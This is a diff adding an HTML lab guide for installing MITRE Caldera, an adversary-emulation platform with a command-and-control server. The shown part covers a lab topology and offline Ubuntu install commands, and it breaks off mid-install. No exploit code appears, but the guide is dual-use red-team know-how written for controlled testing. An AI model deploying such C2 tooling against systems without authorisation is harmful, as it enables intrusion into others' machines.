+          <li class="md-nav__item">
+  <a href="#deploying-linux-agent" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Deploying Linux Agent
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#deploying-windows-agent" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Deploying Windows Agent
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#verifying-access-to-agents" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Verifying Access to Agents
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#creating-a-new-adversary-profile" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Creating a New Adversary Profile
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#creating-custom-abilities" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Creating Custom Abilities
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#downloading-linpeas-and-winpeas" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Downloading LinPEAS and WinPEAS
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#adding-custom-abilities" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Adding Custom Abilities
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#creating-an-operation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Creating an Operation
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#adding-a-manual-command" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Adding a Manual Command
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#generating-an-operation-report-json" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Generating an Operation Report (JSON)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#generating-a-pdf-report" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Generating a PDF Report
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#generating-a-layer-for-mitre-attck-navigator" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Generating a Layer for MITRE ATT&amp;CK Navigator
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#references" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        References
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../navigator/navigator.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    MITRE ATT&amp;CK Navigator
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="caldera"><strong>Caldera</strong></h1>
+<p>Caldera is a cybersecurity platform designed to automate adversary emulation, support red team operations, and streamline incident response.</p>
+<p>Built on the <a href="https://attack.mitre.org/"><strong>MITRE ATT&amp;CK</strong> <strong>framework</strong></a>, Caldera is an ongoing research project at MITRE. It consists of two key components:</p>
+<ol>
+<li><strong>Core System</strong> – The main framework, available in this repository, includes an asynchronous command-and-control (C2) server with a REST API and a web interface.</li>
+<li><strong>Plugins</strong> – Extend the framework’s capabilities, adding functionality such as agents, reporting, and collections of TTPs.</li>
+</ol>
+<iframe width="560" height="315" src="https://www.youtube.com/embed/TqJ1AQSl0P8?si=WEjBxbtizX3T3bc8" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
+
+<h2 id="lab-setup-for-proof-of-concept"><strong>Lab Setup for Proof of Concept</strong></h2>
+<p>In this proof of concept, an attack simulation was conducted on Ubuntu and Windows virtual machines (VMs) within a secure and controlled environment. Caldera was installed on the Ubuntu VM to automate adversary emulation.</p>
+<p><strong>Note: Do not attempt to replicate the attack emulation demonstrated here unless you are properly trained and it is safe to do so. Unauthorised attack emulation can result in legal consequences and unintended damage to systems. Always ensure that such activities are carried out by qualified professionals in a secure, isolated environment.</strong></p>
+<table>
+<thead>
+<tr>
+<th><strong>Host</strong></th>
+<th><strong>OS</strong></th>
+<th><strong>Role</strong></th>
+<th><strong>IP Address</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Fortigate</td>
+<td>Fortios 7.6.0</td>
+<td>Firewall/Router</td>
+<td>192.168.1.10 (WAN) / 10.0.0.1 (LAN)</td>
+</tr>
+<tr>
+<td>Caldera</td>
+<td>Ubuntu 24.04</td>
+<td>Caldera Server</td>
+<td>10.0.0.100</td>
+</tr>
+<tr>
+<td>Ubuntu</td>
+<td>Ubuntu 24.04</td>
+<td>Caldera Linux Agent</td>
+<td>10.0.0.200</td>
+</tr>
+<tr>
+<td>WS2019</td>
+<td>Windows Server 2019</td>
+<td>Caldera Windows Agent</td>
+<td>10.0.0.50</td>
+</tr>
+</tbody>
+</table>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="Caldera_PoC.drawio.png" data-desc-position="bottom"><img alt="Caldera PoC.drawio.png" src="Caldera_PoC.drawio.png"></a></p>
+<h2 id="installing-caldera"><strong>Installing Caldera</strong></h2>
+<p>You can install Caldera in just four commands by following the simplified installation steps. Alternatively, it can be set up and run using a Docker container.</p>
+<h3 id="system-requirements"><strong>System Requirements</strong></h3>
+<p>Caldera is designed to work across various target systems. The key requirements are as follows:</p>
+<ul>
+<li><strong>Operating System:</strong> Linux or macOS</li>
+<li><strong>Python:</strong> Version 3.8 or newer (with pip3)</li>
+<li><strong>NodeJS:</strong> Version 16 or newer (required for Caldera v5)</li>
+<li><strong>Browser:</strong> A modern option, such as Google Chrome (recommended)</li>
+<li><strong>Packages:</strong> As specified in the <a href="https://github.com/mitre/caldera/blob/master/requirements.txt">requirements</a> file</li>
+</ul>
+<h3 id="recommended-setup"><strong>Recommended Setup</strong></h3>
+<p>For a development environment and to enable dynamic agent compilation, the following are advised:</p>
+<ul>
+<li><strong>GoLang:</strong> Version 1.17 or newer (for enhanced agent functionality)</li>
+<li><strong>Hardware:</strong> At least 8GB of RAM and 2 CPUs</li>
+<li><strong>Packages:</strong> As specified in the <a href="https://github.com/mitre/caldera/blob/master/requirements-dev.txt">dev requirements</a> file</li>
+</ul>
+<h2 id="installing-caldera-offline-ubuntu"><strong>Installing Caldera Offline (Ubuntu)</strong></h2>
+<p>The documentation outlines the steps for installing MITRE Caldera offline on Ubuntu 24.04.</p>
+<h3 id="on-an-internet-connected-machine"><strong>On an Internet-Connected Machine</strong></h3>
+<p>On an internet-connected machine, refresh the package lists from the repositories and create a structured directory for downloading dependencies:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>sudo<span class="w"> </span>apt-get<span class="w"> </span>update
+<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>mkdir<span class="w"> </span>-p<span class="w"> </span>~/caldera-offline/<span class="o">{</span>vmtools,pip3,chrome,curl,jq,upx,git,nodejs,nodejs/npm,node-modules,magma-dist,go,go-modules<span class="o">}</span>
+</code></pre></div>
+<p>Download and install VM tools and its dependencies (this will enable copy and pasting and dynamic resolution). </p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="nb">cd</span><span class="w"> </span>~/vmtools
+<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>apt-get<span class="w"> </span>download<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="w">  </span>libatkmm-1.6-1v5<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a><span class="w">  </span>libcairomm-1.0-1v5<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a><span class="w">  </span>libglibmm-2.4-1t64<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a><span class="w">  </span>libgtkmm-3.0-1t64<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a><span class="w">  </span>libmspack0t64<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a><span class="w">  </span>libpangomm-1.4-1v5<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a><span class="w">  </span>libsigc++-2.0-0v5<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a><span class="w">  </span>libxmlsec1t64<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a><span class="w">  </span>libxmlsec1t64-openssl<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-1-12" name="__codelineno-1-12" href="#__codelineno-1-12"></a><span class="w">  </span>open-vm-tools<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-1-13" name="__codelineno-1-13" href="#__codelineno-1-13"></a><span class="w">  </span>open-vm-tools-desktop<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-1-14" name="__codelineno-1-14" href="#__codelineno-1-14"></a><span class="w">  </span>zerofree
+<a id="__codelineno-1-15" name="__codelineno-1-15" href="#__codelineno-1-15"></a>sudo<span class="w"> </span>dpkg<span class="w"> </span>-i<span class="w"> </span>*.deb
+</code></pre></div>
+<p>After installing VM tools, you may need to reboot the VM if copy and pasting does not work. </p>
+<p>Download Python3-pip and its dependencies (required to run <code>pip3 download</code>). </p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="nb">cd</span><span class="w"> </span>~/caldera-offline/pip3
+<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>apt-get<span class="w"> </span>download<span class="w"> </span>python3-pip<span class="w"> </span>python3-setuptools<span class="w"> </span>python3-wheel<span class="w"> </span>ca-certificates<span class="w"> </span>python3<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="w">    </span>python3-pkg-resources<span class="w"> </span>python3-minimal<span class="w"> </span>python3.12<span class="w"> </span>libpython3-stdlib<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a><span class="w">    </span>openssl<span class="w"> </span>debconf<span class="w"> </span>cdebconf<span class="w"> </span>python3-venv<span class="w"> </span>python3-tk<span class="w"> </span>python3-doc<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a><span class="w">    </span>libdebian-installer4<span class="w"> </span>libtextwrap1<span class="w"> </span>python3.12-doc<span class="w"> </span>blt<span class="w"> </span>libtk8.6<span class="w"> </span>tk8.6-blt2.5<span class="w"> </span>python3.12-venv<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a><span class="w">    </span>libc6<span class="w"> </span>libtcl8.6<span class="w"> </span>libfontconfig1<span class="w"> </span>libx11-6<span class="w"> </span>libxft2<span class="w"> </span>libxss1<span class="w"> </span>libjs-jquery<span class="w"> </span>libjs-underscore<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a><span class="w">    </span>python3-pip-whl<span class="w"> </span>python3-setuptools-whl
+</code></pre></div>
+<p>Install the packages in the following order. Verify Python3-pip installation. </p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>sudo<span class="w"> </span>dpkg<span class="w"> </span>-i<span class="w"> </span>python3-minimal_3.12.3-0ubuntu2_amd64.deb
+<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>sudo<span class="w"> </span>dpkg<span class="w"> </span>-i<span class="w"> </span>libpython3-stdlib_3.12.3-0ubuntu2_amd64.deb
+<a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>sudo<span class="w"> </span>dpkg<span class="w"> </span>-i<span class="w"> </span>python3_3.12.3-0ubuntu2_amd64.deb
+<a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>sudo<span class="w"> </span>dpkg<span class="w"> </span>-i<span class="w"> </span>*.deb
+<a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a>pip3<span class="w"> </span>--version
+</code></pre></div>
+<p>If you encounter the warning related to permission issue, simply run the <code>sudo apt-get download &lt;SNIP&gt;</code> command again to proceed.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>#Example
+<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>W: Download is performed unsandboxed as root as file '/home/cyber/python3-pip/build-essential_12.9ubuntu3_amd64.deb' couldn't be accessed by user '_apt'. - pkgAcquire::Run (13: Permission denied)
+</code></pre></div>
+<p>Download and install chrome (recommended for accessing Caldera web interface). Verify installation. </p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="nb">cd</span><span class="w"> </span>~/caldera-offline/chrome
+<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>wget<span class="w"> </span>https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb
+<a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>sudo<span class="w"> </span>dpkg<span class="w"> </span>-i<span class="w"> </span>*.deb
+<a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>google-chrome<span class="w"> </span>--version
+</code></pre></div>
+<p>Download and install curl (required for agent to connect to Caldera server). Verify installation. </p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="nb">cd</span><span class="w"> </span>~/caldera-offline/curl
+<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>sudo<span class="w"> </span>apt-get<span class="w"> </span>download<span class="w"> </span>curl<span class="w"> </span>libc6<span class="w"> </span>libcurl4t64<span class="w"> </span>zlib1g
+<a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>sudo<span class="w"> </span>dpkg<span class="w"> </span>-i<span class="w"> </span>*.deb
+<a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>curl<span class="w"> </span>--help
+</code></pre></div>
+<p>Download and install jq (required to view report in JSON format). Verify installation. </p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="nb">cd</span><span class="w"> </span>~/caldera-offline/jq
+<a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>sudo<span class="w"> </span>apt-get<span class="w"> </span>download<span class="w"> </span>jq<span class="w"> </span>libc6<span class="w"> </span>libjq1
+<a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>sudo<span class="w"> </span>dpkg<span class="w"> </span>-i<span class="w"> </span>*.deb
+<a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a>jq<span class="w"> </span>--help
+</code></pre></div>
+<p>Download upx. </p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="nb">cd</span><span class="w"> </span>~/caldera-offline/upx
+<a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>wget<span class="w"> </span>https://github.com/upx/upx/releases/download/v4.2.4/upx-4.2.4-amd64_linux.tar.xz
+</code></pre></div>
+<p>Download and install Git (required to run <code>git clone</code>). Verify Git installation. </p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="nb">cd</span><span class="w"> </span>~/caldera-offline/git
+<a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>sudo<span class="w"> </span>apt-get<span class="w"> </span>download<span class="w"> </span>git<span class="w"> </span>git-man<span class="w"> </span>liberror-perl
+<a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>sudo<span class="w"> </span>dpkg<span class="w"> </span>-i<span class="w"> </span>*.deb
+<a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a>git<span class="w"> </span>--version
+</code></pre></div>
+<p>Download and install Node.js Verify Node.js installation (required to run <code>npm</code> commands).</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="nb">cd</span><span class="w"> </span>~/caldera-offline/nodejs
+<a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>wget<span class="w"> </span>https://nodejs.org/dist/v22.13.1/node-v22.13.1-linux-x64.tar.xz
+<a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>tar<span class="w"> </span>-xvf<span class="w"> </span>node-v22.13.1-linux-x64.tar.xz
+<a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a>sudo<span class="w"> </span>mv<span class="w"> </span>node-v22.13.1-linux-x64<span class="w"> </span>/usr/local/nodejs
+<a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a><span class="nb">echo</span><span class="w"> </span><span class="s1">'export PATH=/usr/local/nodejs/bin:$PATH'</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>~/.bashrc
+<a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a><span class="nb">source</span><span class="w"> </span>~/.bashrc
+<a id="__codelineno-10-7" name="__codelineno-10-7" href="#__codelineno-10-7"></a>node<span class="w"> </span>--version
+<a id="__codelineno-10-8" name="__codelineno-10-8" href="#__codelineno-10-8"></a>npm<span class="w"> </span>--version
+</code></pre></div>
+<p>Download and install npm v11. Verify npm installation (required to run <code>npm</code> commands). </p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="nb">cd</span><span class="w"> </span>~/caldera-offline/nodejs/npm
+<a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>wget<span class="w"> </span>https://registry.npmjs.org/npm/-/npm-11.0.0.tgz
+<a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>tar<span class="w"> </span>-xzf<span class="w"> </span>~/caldera-offline/nodejs/npm/npm-11.0.0.tgz<span class="w"> </span>-C<span class="w"> </span>~/caldera-offline/nodejs/npm<span class="w"> </span>--strip-components<span class="o">=</span><span class="m">1</span>
+<a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a>sudo<span class="w"> </span>/usr/local/nodejs/bin/node<span class="w"> </span>~/caldera-offline/nodejs/npm/bin/npm-cli.js<span class="w"> </span>install<span class="w"> </span>-g<span class="w"> </span>npm
+<a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a>sudo<span class="w"> </span>ln<span class="w"> </span>-s<span class="w"> </span>/usr/local/nodejs/bin/npm<span class="w"> </span>/usr/bin/npm
+<a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a>npm<span class="w"> </span>--version
+</code></pre></div>
+<p>Download and install Go. Verify Go installation (required to run <code>go</code> commands).</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="nb">cd</span><span class="w"> </span>~/caldera-offline/go
+<a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>wget<span class="w"> </span>https://go.dev/dl/go1.22.11.linux-amd64.tar.gz
+<a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>sudo<span class="w"> </span>tar<span class="w"> </span>-C<span class="w"> </span>/usr/local<span class="w"> </span>-xzf<span class="w"> </span>go1.22.11.linux-amd64.tar.gz
+<a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">"export PATH=\$PATH:/usr/local/go/bin"</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>~/.bashrc
+<a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a><span class="nb">source</span><span class="w"> </span>~/.bashrc
+<a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a>go<span class="w"> </span>version
+</code></pre></div>
+<p>Clone and prepare the Caldera repository's <strong>master</strong> branch. This process may take some time.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="nb">cd</span><span class="w"> </span>~/caldera-offline
+<a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>git<span class="w"> </span>clone<span class="w"> </span>https://github.com/mitre/caldera.git<span class="w"> </span>--recursive<span class="w"> </span>--branch<span class="w"> </span>master
+</code></pre></div>
+<p>Navigate <code>~/caldera-offline/caldera/plugins/atomic/data</code> and clone and prepare Atomic Red Team repository. This process may take some time.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="nb">cd</span><span class="w"> </span>~/caldera-offline/caldera/plugins/atomic/data
+<a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>git<span class="w"> </span>clone<span class="w"> </span>--depth<span class="o">=</span><span class="m">1</span><span class="w"> </span>https://github.com/redcanaryco/atomic-red-team.git
+</code></pre></div>
+<p>Fetch Golang dependencies for the Sandcat plugin.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="nb">cd</span><span class="w"> </span>~/caldera-offline/caldera/plugins/sandcat/gocat
+<a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>go<span class="w"> </span>mod<span class="w"> </span>tidy<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>go<span class="w"> </span>mod<span class="w"> </span>download
+<a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a>cp<span class="w"> </span>-r<span class="w"> </span>~/go/pkg/mod<span class="w"> </span>~/caldera-offline/go-modules
+</code></pre></div>
+<p>Fetch Node.js dependencies for the Magma plugin.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="nb">cd</span><span class="w"> </span>~/caldera-offline/caldera/plugins/magma
+<a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>npm<span class="w"> </span>install
+<a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a>npm<span class="w"> </span>run<span class="w"> </span>build
+<a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a>cp<span class="w"> </span>-r<span class="w"> </span>node_modules<span class="w"> </span>~/caldera-offline/node-modules
+<a id="__codelineno-16-5" name="__codelineno-16-5" href="#__codelineno-16-5"></a>cp<span class="w"> </span>-r<span class="w"> </span>dist<span class="w"> </span>~/caldera-offline/magma-dist
+</code></pre></div>
+<p>Edit <code>caldera-offline/caldera/requirements.txt</code> with the following changes:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>nano<span class="w"> </span>~/caldera-offline/caldera/requirements.txt
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="c1">#Ubuntu 24.04</span>
+<a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a>aiohttp-jinja2<span class="o">==</span><span class="m">1</span>.5.1
+<a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a><span class="nv">aiohttp</span><span class="o">==</span><span class="m">3</span>.10.8
+<a id="__codelineno-18-4" name="__codelineno-18-4" href="#__codelineno-18-4"></a><span class="nv">aiohttp_session</span><span class="o">==</span><span class="m">2</span>.12.0
+<a id="__codelineno-18-5" name="__codelineno-18-5" href="#__codelineno-18-5"></a>aiohttp-security<span class="o">==</span><span class="m">0</span>.4.0
+<a id="__codelineno-18-6" name="__codelineno-18-6" href="#__codelineno-18-6"></a>aiohttp-apispec<span class="o">==</span><span class="m">3</span>.0.0b2
+<a id="__codelineno-18-7" name="__codelineno-18-7" href="#__codelineno-18-7"></a><span class="nv">jinja2</span><span class="o">==</span><span class="m">3</span>.1.3
+<a id="__codelineno-18-8" name="__codelineno-18-8" href="#__codelineno-18-8"></a><span class="nv">pyyaml</span><span class="o">==</span><span class="m">6</span>.0.1
+<a id="__codelineno-18-9" name="__codelineno-18-9" href="#__codelineno-18-9"></a><span class="nv">cryptography</span><span class="o">==</span><span class="m">42</span>.0.3<span class="w"> </span><span class="c1">#ref issues</span>
+<a id="__codelineno-18-10" name="__codelineno-18-10" href="#__codelineno-18-10"></a><span class="nv">websockets</span><span class="o">==</span><span class="m">11</span>.0.3
+<a id="__codelineno-18-11" name="__codelineno-18-11" href="#__codelineno-18-11"></a><span class="nv">Sphinx</span><span class="o">==</span><span class="m">7</span>.1.2
+<a id="__codelineno-18-12" name="__codelineno-18-12" href="#__codelineno-18-12"></a><span class="nv">sphinx_rtd_theme</span><span class="o">==</span><span class="m">1</span>.3.0
+<a id="__codelineno-18-13" name="__codelineno-18-13" href="#__codelineno-18-13"></a>myst-parser<span class="o">==</span><span class="m">2</span>.0.0
+<a id="__codelineno-18-14" name="__codelineno-18-14" href="#__codelineno-18-14"></a><span class="nv">marshmallow</span><span class="o">==</span><span class="m">3</span>.20.1
+<a id="__codelineno-18-15" name="__codelineno-18-15" href="#__codelineno-18-15"></a><span class="nv">dirhash</span><span class="o">==</span><span class="m">0</span>.2.1
+<a id="__codelineno-18-16" name="__codelineno-18-16" href="#__codelineno-18-16"></a>marshmallow-enum<span class="o">==</span><span class="m">1</span>.5.1
+<a id="__codelineno-18-17" name="__codelineno-18-17" href="#__codelineno-18-17"></a><span class="nv">ldap3</span><span class="o">==</span><span class="m">2</span>.9.1
+<a id="__codelineno-18-18" name="__codelineno-18-18" href="#__codelineno-18-18"></a>lxml~<span class="o">=</span><span class="m">4</span>.9.1<span class="w">  </span><span class="c1"># debrief</span>
+<a id="__codelineno-18-19" name="__codelineno-18-19" href="#__codelineno-18-19"></a><span class="nv">reportlab</span><span class="o">==</span><span class="m">4</span>.0.4<span class="w">  </span><span class="c1"># debrief</span>
+<a id="__codelineno-18-20" name="__codelineno-18-20" href="#__codelineno-18-20"></a><span class="nv">rich</span><span class="o">==</span><span class="m">13</span>.7.0
+<a id="__codelineno-18-21" name="__codelineno-18-21" href="#__codelineno-18-21"></a><span class="nv">svglib</span><span class="o">==</span><span class="m">1</span>.5.1<span class="w">  </span><span class="c1"># debrief</span>
+<a id="__codelineno-18-22" name="__codelineno-18-22" href="#__codelineno-18-22"></a><span class="nv">Markdown</span><span class="o">==</span><span class="m">3</span>.4.4<span class="w">  </span><span class="c1"># training</span>
+<a id="__codelineno-18-23" name="__codelineno-18-23" href="#__codelineno-18-23"></a><span class="nv">dnspython</span><span class="o">==</span><span class="m">2</span>.4.2
+<a id="__codelineno-18-24" name="__codelineno-18-24" href="#__codelineno-18-24"></a><span class="nv">asyncssh</span><span class="o">==</span><span class="m">2</span>.14.1
+<a id="__codelineno-18-25" name="__codelineno-18-25" href="#__codelineno-18-25"></a>aioftp~<span class="o">=</span><span class="m">0</span>.20.0
+<a id="__codelineno-18-26" name="__codelineno-18-26" href="#__codelineno-18-26"></a><span class="nv">packaging</span><span class="o">==</span><span class="m">24</span>.2<span class="w"> </span><span class="c1">#ref issues</span>
+<a id="__codelineno-18-27" name="__codelineno-18-27" href="#__codelineno-18-27"></a>croniter~<span class="o">=</span><span class="m">3</span>.0.3
+<a id="__codelineno-18-28" name="__codelineno-18-28" href="#__codelineno-18-28"></a>pyopenssl<span class="w"> </span><span class="c1">#ref issues</span>
+<a id="__codelineno-18-29" name="__codelineno-18-29" href="#__codelineno-18-29"></a>docker<span class="w"> </span><span class="c1">#resolve warning</span>
+</code></pre></div>
+<p>Make a directory for Python dependencies and download all dependencies listed in the <code>requirements-dev.txt</code> and <code>requirements.txt</code> into the <code>python_deps</code> folder. </p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>mkdir<span class="w"> </span>~/caldera-offline/caldera/python_deps
